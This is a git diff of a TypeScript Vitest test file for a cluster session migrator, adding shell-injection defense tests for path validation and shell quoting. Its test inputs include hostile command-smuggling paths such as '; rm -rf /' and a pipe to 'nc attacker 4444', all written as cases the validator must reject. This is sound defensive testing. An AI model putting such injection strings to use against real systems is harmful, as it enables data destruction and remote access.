@@ -6,7 +6,7 @@
 
 import { describe, it, expect, vi, afterEach } from 'vitest'
 import { EventEmitter } from 'node:events'
-import { createMigrator, cwdHash } from '../src/migrator.js'
+import { createMigrator, cwdHash, assertSafePath, UnsafePathError, shellQuote } from '../src/migrator.js'
 import type { ClusterManager, MachineState } from '../src/clusterManager.js'
 
 // ---------------------------------------------------------------------------
@@ -91,6 +91,52 @@ describe('cwdHash', () => {
   })
 })
 
+describe('assertSafePath (shell-injection defense)', () => {
+  it('accepts typical macOS paths', () => {
+    expect(() => assertSafePath('/Users/jack/code/remote-cc')).not.toThrow()
+    expect(() => assertSafePath('/opt/app_v2/data-1.2')).not.toThrow()
+  })
+
+  it('rejects relative paths', () => {
+    expect(() => assertSafePath('relative/path')).toThrow(UnsafePathError)
+  })
+
+  it('rejects path traversal', () => {
+    expect(() => assertSafePath('/a/../etc/passwd')).toThrow(/\.\./)
+  })
+
+  it('rejects shell metacharacters that would let a cluster-token holder inject commands', () => {
+    const bad = [
+      '/tmp/p; rm -rf /',
+      '/tmp/p && whoami',
+      '/tmp/p`pwd`',
+      '/tmp/p$HOME',
+      '/tmp/p\n',
+      '/tmp/p with space',
+      '/tmp/p|nc attacker 4444',
+      "/tmp/p'injected'",
+      '/tmp/p"injected"',
+      '/tmp/p(',
+    ]
+    for (const p of bad) {
+      expect(() => assertSafePath(p)).toThrow(UnsafePathError)
+    }
+  })
+
+  it('rejects empty string', () => {
+    expect(() => assertSafePath('')).toThrow(UnsafePathError)
+  })
+})
+
+describe('shellQuote', () => {
+  it('wraps value in single quotes', () => {
+    expect(shellQuote('/tmp/p')).toBe(`'/tmp/p'`)
+  })
+  it("escapes embedded single quotes using '\\''", () => {
+    expect(shellQuote("a'b")).toBe(`'a'\\''b'`)
+  })
+})
+
 describe('migrator.migrate()', () => {
   const base = {
     clusterToken: 'clust-tok',
@@ -127,30 +173,68 @@ describe('migrator.migrate()', () => {
     expect(r.error).toMatch(/session nope not found/)
   })
 
-  it('stops running source session before migrating', async () => {
+  it.each(['running', 'spawning', 'stopping'] as const)(
+    'stops source session in %s state before migrating (cold-migration guard)',
+    async (state) => {
+      const cluster = makeCluster({
+        src: makeMachine({
+          machineId: 'src',
+          status: state,
+          sessionId: 's1',
+          sessions: [{ id: 's1', shortId: 's100', project: 'p', cwd: '/tmp/p', time: '2026-01-01', summary: '' }],
+        }),
+        dst: makeMachine({ machineId: 'dst' }),
+      })
+      const { spawnImpl } = makeSpawnMock([
+        { code: 0 }, // rsync
+        { code: 0 }, // ssh mkdir
+        { code: 0 }, // scp
+      ])
+      const fetchMock = vi.fn()
+        .mockResolvedValueOnce(makeFetchResp({ ok: true })) // stop
+        .mockResolvedValueOnce(makeFetchResp({ ok: true })) // start
+      const mig = createMigrator({ cluster, spawnImpl, fetchImpl: fetchMock, ...base })
+      const r = await mig.migrate({ fromMachineId: 'src', toMachineId: 'dst', sessionId: 's1' })
+      expect(r.ok).toBe(true)
+      const firstBody = JSON.parse(fetchMock.mock.calls[0][1].body)
+      expect(firstBody).toMatchObject({ machineId: 'src', action: 'stop_session' })
+    },
+  )
+
+  it('refuses to migrate with a cwd containing shell metacharacters', async () => {
     const cluster = makeCluster({
       src: makeMachine({
         machineId: 'src',
-        status: 'running',
-        sessionId: 's1',
+        sessions: [{ id: 's1', shortId: 's100', project: 'p', cwd: '/tmp/p; rm -rf /', time: '2026-01-01', summary: '' }],
+      }),
+      dst: makeMachine({ machineId: 'dst' }),
+    })
+    const { spawnImpl, calls } = makeSpawnMock([])
+    const fetchMock = vi.fn()
+    const mig = createMigrator({ cluster, spawnImpl, fetchImpl: fetchMock, ...base })
+    const r = await mig.migrate({ fromMachineId: 'src', toMachineId: 'dst', sessionId: 's1' })
+    expect(r.ok).toBe(false)
+    expect(r.error).toMatch(/unsafe source cwd/i)
+    // Nothing was spawned — rejection happens before any rsync/ssh/scp
+    expect(calls).toHaveLength(0)
+    expect(fetchMock).not.toHaveBeenCalled()
+  })
+
+  it('scp runs with the -3 flag (routes via server, required when source and target cannot reach each other)', async () => {
+    const cluster = makeCluster({
+      src: makeMachine({
+        machineId: 'src',
         sessions: [{ id: 's1', shortId: 's100', project: 'p', cwd: '/tmp/p', time: '2026-01-01', summary: '' }],
       }),
       dst: makeMachine({ machineId: 'dst' }),
     })
-    const { spawnImpl } = makeSpawnMock([
-      { code: 0 }, // rsync
-      { code: 0 }, // ssh mkdir
-      { code: 0 }, // scp
-    ])
-    const fetchMock = vi.fn()
-      .mockResolvedValueOnce(makeFetchResp({ ok: true })) // stop
-      .mockResolvedValueOnce(makeFetchResp({ ok: true })) // start
+    const { spawnImpl, calls } = makeSpawnMock([{ code: 0 }, { code: 0 }, { code: 0 }])
+    const fetchMock = vi.fn().mockResolvedValue(makeFetchResp({ ok: true }))
     const mig = createMigrator({ cluster, spawnImpl, fetchImpl: fetchMock, ...base })
-    const r = await mig.migrate({ fromMachineId: 'src', toMachineId: 'dst', sessionId: 's1' })
-    expect(r.ok).toBe(true)
-    // First call should be the stop action
-    const firstBody = JSON.parse(fetchMock.mock.calls[0][1].body)
-    expect(firstBody).toMatchObject({ machineId: 'src', action: 'stop_session' })
+    await mig.migrate({ fromMachineId: 'src', toMachineId: 'dst', sessionId: 's1' })
+    // Third spawn call is scp (after rsync + ssh mkdir)
+    const scpCall = calls.find((c) => c.bin === 'scp' || c.bin.endsWith('/scp')) ?? calls[2]
+    expect(scpCall.args[0]).toBe('-3')
   })
 
   it('happy path: rsync + mkdir + scp + start → ok true', async () => {
@@ -171,10 +255,10 @@ describe('migrator.migrate()', () => {
     const mig = createMigrator({ cluster, spawnImpl, fetchImpl: fetchMock, ...base })
     const r = await mig.migrate({ fromMachineId: 'src', toMachineId: 'dst', sessionId: 's1' })
     expect(r.ok).toBe(true)
-    // rsync used correct src/dst hostnames
+    // rsync used correct src/dst hostnames (paths are shell-quoted)
     expect(calls[0].bin).toBe('rsync')
-    expect(calls[0].args.some((a) => a.includes('alpha-host:/tmp/p/'))).toBe(true)
-    expect(calls[0].args.some((a) => a.includes('bravo-host:/tmp/p/'))).toBe(true)
+    expect(calls[0].args.some((a) => a.includes("alpha-host:'/tmp/p/'"))).toBe(true)
+    expect(calls[0].args.some((a) => a.includes("bravo-host:'/tmp/p/'"))).toBe(true)
     // scp used the cwd hash path
     const expected = cwdHash('/tmp/p')
     expect(calls[2].args.some((a) => a.includes(expected))).toBe(true)
